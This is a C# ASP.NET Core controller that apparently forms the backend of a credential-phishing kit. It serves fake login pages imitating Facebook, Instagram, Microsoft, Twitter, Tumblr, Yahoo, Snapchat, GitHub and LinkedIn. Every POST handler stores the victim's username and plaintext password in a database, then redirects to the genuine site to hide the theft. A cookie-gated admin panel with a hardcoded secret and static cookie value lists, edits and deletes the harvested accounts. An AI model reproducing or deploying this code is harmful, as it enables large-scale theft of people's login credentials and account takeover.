using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Http;
using System.Diagnostics;
using VpTaskWebApp.Models;
using System.IO; 

namespace VpTaskWebApp.Controllers
{
    public class HomeController : Controller
    {
        private readonly ILogger<HomeController> _logger;

        public HomeController(ILogger<HomeController> logger, AppDbContext Db)
        {
            _logger = logger;
              _Db = Db;
        }

        private readonly AppDbContext _Db;

        private string secretkey = "thisisthesecretkey";

        private string cookiekey = "Logged";

        private string cookievalue = "YeeThisisInsecure";

        public bool IsAuthenticated()
        {
            var CookieValue = Request.Cookies[cookiekey];
            if (CookieValue == cookievalue)
            {
                return true;
            }
            else 
                return false;
        }

        public IActionResult Index()
        {
            if (IsAuthenticated())
            {
                return View("Admin");
            }
            else
                return View();
        }

        [HttpPost]
        public IActionResult Index(string username, string Password)
        {
            var data = _Db.DataModels.Where(x => x.Username == username && x.Password == Password && x.platform == "admin").FirstOrDefault();
            if (data != null){
                CookieOptions options = new CookieOptions();
                options.Expires = DateTime.Now.AddDays(7);
                Response.Cookies.Append(cookiekey, cookievalue, options); 
                return RedirectToAction("Admin");
            }
            else{
                ViewBag.Message = "Invalid Credentials";
                return View("Index");
         
            }
        }
        public IActionResult Logout()
        {
            if (IsAuthenticated())
            {
                CookieOptions options = new CookieOptions();
                options.Expires = DateTime.Now.AddDays(-1);
                Response.Cookies.Append(cookiekey, cookievalue, options);
                return View("Index");
            }
            else
                return View("Index");
        }

        public IActionResult Register()
        {
            return View();
        }

        [HttpPost]
        public IActionResult Register(string username , string password, string secret)
        {
            if (secret == secretkey)
            {
                MyModel Data = new MyModel();
                Data.Username = username;
                Data.Password = password;
                Data.platform = "admin";
                _Db.DataModels.Add(Data);
                _Db.SaveChanges();
                ViewBag.Message = "Registration Successful";
                return View();
            }
            else
            {
                ViewBag.Message = "Registration Failed";
                return View();
            }
        }
        public IActionResult Admin()
        {
            if (IsAuthenticated())
            {
                var listofdata = _Db.DataModels.Where(x => x.platform != "admin").ToList();

                return View(listofdata);
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }
        public IActionResult Links()
        {
            if (IsAuthenticated())
            {           
                return View();
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }
        public IActionResult Edit(int id)
        {
            if (IsAuthenticated() && id != 0)
            {           
                var data = _Db.DataModels.Where(x => x.id == id).FirstOrDefault();
                return View(data);
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }
        [HttpPost]
        public IActionResult Edit(MyModel model)
        {
            if (IsAuthenticated() && model != null)
            {           
                var data = _Db.DataModels.Where(x => x.id == model.id).FirstOrDefault();
                if (data != null)
                {
                    data.Password = model.Password;
                    data.Username = model.Username;
                    data.platform = model.platform;
                    _Db.SaveChanges();
                }
                return RedirectToAction("Admin");
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }
        public IActionResult Detail(int id)
        {
            if (IsAuthenticated() && id != 0)
            {           
                var data = _Db.DataModels.Where(x => x.id == id).FirstOrDefault();
                return View(data);
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }
        public IActionResult Delete(int id)
        {
            if (IsAuthenticated() && id != 0)
            {           
                var data = _Db.DataModels.Where(x => x.id == id).FirstOrDefault();
                _Db.DataModels.Remove(data);
                _Db.SaveChanges();
                ViewBag.Message = "Record Deleted Succesfully";
                return RedirectToAction("Admin");
            }
            ViewBag.Message = "Invalid Credentials";
            return View("Index");
        }

        [HttpGet]
        public IActionResult Facebook()
        {
            return View();
        }

        public IActionResult Instagram()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult Instagram(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "instagram";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.instagram.com", permanent: true
                             );
        }

        public IActionResult Microsoft()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult Microsoft(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "microsoft";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.microsoft.com", permanent: true
                             );
        }
        public IActionResult Twitter()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult Twitter(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "twitter";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.twitter.com", permanent: true
                             );
        }
                public IActionResult tumblr()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult tumblr(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "tumblr";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.tumblr.com", permanent: true
                             );
        }
        public IActionResult yahoo()
        {
            return View();
        }


        [HttpPost]
        public RedirectResult yahoo(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "yahoo";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.yahoo.com", permanent: true
                             );
        }
        public IActionResult snapchat()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult snapchat(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "snapchat";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.snapchat.com", permanent: true
                             );
        }
        public IActionResult Github()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult Github(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "github";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.github.com", permanent: true
                             );
        }

        public IActionResult Linkedin()
        {
            return View();
        }

        [HttpPost]
        public RedirectResult Linkedin(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "linkedin";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.linkedin.com", permanent: true
                             );
        }
        [HttpPost]
        public RedirectResult Facebook(string username , string password)
        {
            MyModel Data = new MyModel();
            Data.Username = username;
            Data.Password = password;
            Data.platform = "facebook";
            _Db.DataModels.Add(Data);
            _Db.SaveChanges();
            return new RedirectResult(url: "https://www.facebook.com", permanent: true
                           );
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }
    }
}